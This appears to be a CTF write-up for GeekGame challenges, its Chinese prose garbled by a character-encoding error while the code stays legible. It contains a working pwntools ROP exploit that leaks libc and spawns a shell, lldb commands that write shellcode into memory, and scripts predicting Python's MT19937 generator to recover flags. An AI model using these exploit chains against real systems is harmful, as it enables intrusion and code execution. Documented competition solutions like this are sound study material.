æ³„æ¼ libc åœ°å€å¯ä»¥é€šè¿‡æ‰“å° got é‡Œä»»æ„å‡½æ•°çš„åœ°å€ï¼Œå†å‡å» libc é‡Œè¯¥å‡½æ•°çš„ç›¸å¯¹åœ°å€ã€‚

é‚£åˆæ€ä¹ˆæ‰“å°åœ°å€å‘¢ï¼Ÿ
åŸæ¥æƒ³ syscall è°ƒ write çš„ï¼Œä¸€çœ‹ gadget ä¸å¤Ÿï¼Œåªèƒ½æƒ³åŠæ³•åˆ©ç”¨ç¨‹åºé‡Œæœ‰çš„å‡½æ•°äº†ã€‚

x64 ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯é€šè¿‡ rdi å¯„å­˜å™¨ä¼ çš„ï¼Œä½†æ˜¯æ²¡æœ‰ pop rdi gadget æ€ä¹ˆåŠå‘¢ã€‚
å¶ç„¶å‘ç°ï¼Œç¨‹åºè°ƒç”¨ puts å‡½æ•°å‰çš„ rdi çš„å€¼æ˜¯ä» rbx æ‹¿çš„ï¼Œè€Œæˆ‘ä»¬æœ‰ä¸€ä¸ª pop rbx gadgetï¼Œé‚£å°±å¥½åŠäº†ï¼ŒæŠŠæƒ³ä¼ çš„å‚æ•°å†™å…¥ rbx å°±å¥½äº†ã€‚

æœ‰äº† libc çš„åŸºåœ°å€ï¼Œä¹Ÿå°±å¯ä»¥ç®—å‡º libc ä¸­ /bin/sh çš„å®é™…åœ°å€ï¼Œä»è€Œè°ƒç”¨ system("/bin/sh") äº†ã€‚

æœ€åçš„ expï¼š

```python
from pwn import *
context.clear(arch='amd64')
elf = ELF('./challenge2')
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

rop.raw('A' * 112)
# ret
rop.raw(p64(0x40101a))

# pop rbx ; pop rbp ; pop r12 ; ret
rop.call(0x401300)
rop.raw(p64(elf.got['puts']))
rop.raw(p64(elf.got['puts']))
rop.raw(p64(elf.got['puts']))
# mov rdi, rbx; puts
rop.call(0x4012e3) 

#p = process('./challenge2')
p = remote('prob10.geekgame.pku.edu.cn', 10011)
p.sendline(b'TOKEN')
p.recvuntil(b'characters')
p.sendline(b'1')
p.recvuntil(b'flag: ')

p.recvuntil(b'it?')
p.sendline(rop.chain())
p.recvuntil(b'again')
p.sendline(b'1')

p.recvuntil(b'go0d_j0b_und_go0d_luck~:)\n')
leaked_puts = p.recvline().strip()

libc.address = int.from_bytes(leaked_puts, 'little') - libc.symbols['puts']
log.success(f'libc addr={hex(libc.address)}')
sh_addr = next(libc.search(b'/bin/sh'))

rop2 = ROP(elf)
rop2.raw('A' * 112)
# ret
rop2.raw(p64(0x40101a))
# nop ; ret
rop2.raw(p64(0x40112f))
# ropper --file libc.so.6 --search "pop rdi"
pop_rdi = libc.address + 0x2a3e5
rop2.raw(p64(pop_rdi))
rop2.raw(p64(sh_addr))
rop2.raw(p64(libc.symbols['system']))

p.recvuntil(b'characters')
p.sendline(b'1')
p.recvuntil(b'flag: ')
p.recvuntil(b'it?')
p.sendline(rop2.chain())
p.recvuntil(b'again')
p.sendline(b'1')
p.interactive()
```

## ç¦æ­¢æ‰§è¡Œï¼Œå¯åŠ¨

### Flag 1

ç¯å¢ƒé‡Œæä¾›äº† lldbï¼Œé‚£å°±å¯ä»¥ç”¨ lldb ä¿®æ”¹å†…å­˜ä¸­ binary çš„ä»£ç ï¼Œä»è€Œæ‰§è¡Œ shell codeã€‚
æˆ‘è¿™é‡Œç”¨ `process launch --stop-at-entry` åœ¨ç¨‹åºå¼€å§‹å‰æ–­ä¸‹æ¥ï¼Œå¹¶æŠŠ shell code å†™åœ¨äº† entry pointã€‚

```
memory write 0x4038b1 0x31
memory write 0x4038b2 0xc0
memory write 0x4038b3 0x66
memory write 0x4038b4 0xb8
memory write 0x4038b5 0x24
memory write 0x4038b6 0x02
memory write 0x4038b7 0x31
memory write 0x4038b8 0xff
memory write 0x4038b9 0x48
memory write 0x4038ba 0x89
memory write 0x4038bb 0xe6
memory write 0x4038bc 0x0f
memory write 0x4038bd 0x05
```

é¢˜ç›®ç»™çš„ getflag syscall æŠŠ flag å†™åˆ°äº† rspï¼Œä¸è¿‡è¿™é‡Œæ²¡æœ‰è°ƒè¾“å‡º rspã€‚
~~éƒ½æœ‰è°ƒè¯•å™¨äº†ï¼Œæ‰‹åŠ¨çœ‹ä¸€ä¸‹ä¹ŸæŒºæ–¹ä¾¿ï¼Œæ€»æ¯”å†æ„é€  memory write è¯­å¥æ–¹ä¾¿~~ã€‚


## æœªæ¥ç£ç›˜

### Flag 1

é¢˜ç›®è¯´ç»è¿‡äº†å¤šæ¬¡ gzip å‹ç¼©ï¼Œæ‰€ä»¥å…ˆæ‘¸ä¸ªåº•ï¼Œé‡å¤è§£å‹ï¼Œç›´åˆ°æ–‡ä»¶çš„ header ä¸å†æ˜¯ gzip æ–‡ä»¶å¤´ 1f 8bã€‚

æ­¤æ—¶å¾—åˆ°äº†ä¸€ä¸ª 7.5G çš„å‹ç¼©æ–‡ä»¶ï¼ŒæŠŠå®ƒè§£å‹äº†å°±æœ‰ flag äº†ã€‚

å› ä¸ºè´«ç©·ï¼Œæˆ‘æ²¡æœ‰ 7TB çš„å‰©ä½™ç©ºé—´ï¼Œåªå¥½è§£å‹åˆ°ç®¡é“ï¼Œå–‚ç»™ä¸€ä¸ªèƒ½æ‰“å° flag çš„ç¨‹åºï¼Œæ¯”å¦‚ stringsã€‚

æŒ‚äº†å‡ ä¸ªå°æ—¶ï¼Œç»ˆç«¯çš„è¾“å‡ºä»ç„¶æ˜¯ç©ºçš„ï¼Œæˆ‘å¼€å§‹æ€€ç–‘ä¸èƒ½è¿™ä¹ˆæš´åŠ›äº†ï¼Œäºæ˜¯å¼€å§‹ç ”ç©¶é‚£ä¸ªæ–‡ä»¶ã€‚

è¿è¡Œ `cat /dev/zero | gzip | xxd`ï¼Œå¯ä»¥çœ‹åˆ°ä¸€å † UUUUï¼Œé‚£å°±æ˜¯å‹ç¼©åçš„ 0ã€‚
é‚£ä¹ˆåªè¦æŠŠæ‰¾åˆ°ä¸åŒ…å« U çš„ offsetï¼Œå°±æ˜¯ flag é™„è¿‘ã€‚

é€šè¿‡æ‰§è¡Œ `xxd flag1.gz | grep -v U`ï¼Œå¯ä»¥æ¨æµ‹ flag åœ¨ e0eb80f0 é™„è¿‘ã€‚

```hexdump
00001000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00001010: 0000 0000 0000 80d9 8303 0100 0000 0020  ...............
e0eb80f0: 252b d884 74d6 368f 8144 04d3 d88a bb0b  %+..t.6..D......
e0eb8100: ce71 37c2 fdc6 b51f cf4c 778f b2d5 35c6  .q7......Lw...5.
e0eb8110: 997b b434 9757 0d00 0000 0000 0000 0000  .{.4.W..........
e0eb8120: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

~~æˆ‘æŠŠè¿™ä¸€æ®µæå‡ºæ¥ä¹‹åä¸çŸ¥é“æ€ä¹ˆè§£å‹ï¼Œç¢ç£¨äº†åŠå¤©ï¼Œç„¶åå‘ç°æš´åŠ›è·‘å‡ºç»“æœäº†ï¼Œäºæ˜¯16è¿›åˆ¶ç¼–è¾‘å™¨å…³é—­~~ã€‚


## å°ç« é±¼çš„æ›²å¥‡


### Smol Cookie

çœ‹ä»£ç ï¼Œéœ€è¦é¢„æµ‹ PRNG æ‰èƒ½æ‹¿åˆ° flagã€‚æˆ‘ä»¬çŸ¥é“è¿ç»­ 2500 å­—èŠ‚çš„è¾“å‡ºï¼Œå¯ä»¥æ‰¾ä¸€ä¸ª MT19937 é¢„æµ‹åº“è§£ã€‚

```python
from pwn import *
from mt19937predictor import MT19937Predictor

predictor = MT19937Predictor()
p = remote('prob08.geekgame.pku.edu.cn', 10008)
p.sendline(b'TOKEN')
p.recvuntil(b'one:')
p.sendline(b'1')
p.recvuntil(b'void')
p.recvline()

c = p.recvline().decode()

cb = bytes.fromhex(c)
zero = cb[:2500]
flag_len = len(cb) - 2500
predictor.setrandbits(int.from_bytes(zero, 'little'), 2500 * 8)
print(int.to_bytes(predictor.getrandbits(flag_len * 8) ^ int.from_bytes(cb[2500:], 'little'), flag_len, 'little'))
```

### Big Cookie

é¢˜ç›®æŠŠæ˜æ–‡ä¸ 3 ä¸²éšæœºå­—èŠ‚ xorï¼Œç¬¬ä¸€ä¸² seed ä¼šè¾“å‡ºï¼Œæˆ‘ä»¬åˆå¯ä»¥æŒ‡å®šç¬¬äºŒä¸² seedï¼Œå¯ä»¥çŒœæµ‹æœ‰åŠæ³•è®©ç¬¬ä¸€ä¸²å’Œç¬¬äºŒä¸²éšæœºå­—ç¬¦ä¸²æ¶ˆæ‰ï¼Œç„¶åå°±å’Œç¬¬ä¸€é—®ä¸€æ ·äº†ã€‚

æœ‰æ²¡æœ‰åŠæ³•åœ¨æŒ‡å®šä¸ä¸€æ · seed çš„æƒ…å†µä¸‹è®©éšæœºçŠ¶æ€ä¸€è‡´å‘¢ï¼Ÿ
å¸¦ç€è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘å»ç¿»äº† python åº“éšæœºçš„[å®ç°](https://github.com/python/cpython/blob/main/Modules/_randommodule.c)ã€‚

å¦‚æ³¨é‡Šæ‰€è¯´ï¼Œéšæœºç®—æ³•ä¼šç”¨å‚æ•°çš„ç»å¯¹å€¼åšè¿ç®—ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤ä¸ª seed å¦‚æœåªæœ‰ç¬¦å·çš„å·®å¼‚çš„è¯å®é™…ä¸Šæ˜¯ç­‰æ•ˆçš„ã€‚

æ‰€ä»¥è¿™ä¸€é—®åªè¦æŒ‡å®š seed2 ä¸º seed1 çš„è´Ÿæ•°ï¼Œå†ç”¨ç¬¬ä¸€é—®çš„æ–¹æ³•é¢„æµ‹ PRNGï¼Œå°±èƒ½æ‹¿åˆ° flagã€‚

~~å¦å¤–æ²¡æ˜ç™½é¢˜ç›®ä¿®æ”¹ void1 å’Œ void2 çŠ¶æ€å¹²ä»€ä¹ˆï¼Œéƒ½æŠµæ¶ˆäº†è¿˜è™šæ™ƒä¸€æªã€‚~~

```python
from pwn import *
from mt19937predictor import MT19937Predictor


predictor = MT19937Predictor()
p = remote('prob08.geekgame.pku.edu.cn', 10008)
p.sendline(b'TOKEN')
p.recvuntil(b'one:')
p.sendline(b'2')
p.recvuntil(b'<')
seed = p.recvline().decode().replace('>', '')
seed = int(seed, 16)
seed_eq = -seed
p.recvuntil(b'> ')
p.sendline(f'{hex(seed_eq)}'.encode())
p.recvuntil(b'void')
p.recvline()
c = p.recvline().decode()
cb = bytes.fromhex(c)
zero = cb[:2500]
flag_len = len(cb) - 2500
predictor.setrandbits(int.from_bytes(zero, 'little'), 2500 * 8)
print(int.to_bytes(predictor.getrandbits(flag_len * 8) ^ int.from_bytes(cb[2500:], 'little'), flag_len, 'little'))
```

### SUPA BIG Cookie

é¢˜ç›®åªæ£€æŸ¥è¿ç»­100æ¬¡çš„éšæœºç»“æœæ˜¯å¦ä¸€æ ·ï¼Œæ‰€ä»¥åªè¦æŠŠéšæœºç§å­è®¾å®šæˆä¸€æ ·å³å¯é€šè¿‡ã€‚

```python
from pwn import *

p = remote('prob08.geekgame.pku.edu.cn', 10008)
p.sendline(b'TOKEN')
p.recvuntil(b'one:')
p.sendline(b'3')
p.recvuntil(b'<')
curses = p.recvline().decode().replace('>', '')
p.sendline(curses.encode())
p.interactive()
```